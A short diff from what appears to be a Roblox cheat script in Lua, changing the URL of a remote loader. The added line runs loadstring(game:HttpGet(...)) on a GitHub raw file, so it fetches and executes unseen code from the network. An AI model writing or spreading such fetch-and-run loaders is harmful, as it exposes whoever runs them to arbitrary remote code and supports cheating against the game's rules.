@@ -184,7 +184,7 @@ local Data = LocalPlayer:WaitForChild("Data")
 
 task.spawn(function()
 _G.Key = "PP"
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/1703a94a765f93c96ae31baa4385cdd2.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NewMeO/RobloxScript/refs/heads/main/request.lua"))()
 end)
 
 local run_quarty = {}
